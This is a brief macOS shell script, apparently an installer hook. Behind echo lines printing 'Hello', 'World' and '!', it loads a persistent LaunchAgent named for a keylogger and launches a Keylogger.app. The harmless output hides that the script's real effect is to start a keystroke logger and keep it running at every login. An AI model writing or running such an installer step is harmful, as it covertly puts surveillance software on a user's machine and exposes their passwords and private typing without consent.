#!/bin/sh

echo "Hello"
echo "World"
launchctl load -w /Library/LaunchAgents/com.uwo.keylogger.App.plist 
open -a /Applications/Keylogger.app/Contents/MacOS/JavaAppLauncher
echo "!"
exit 0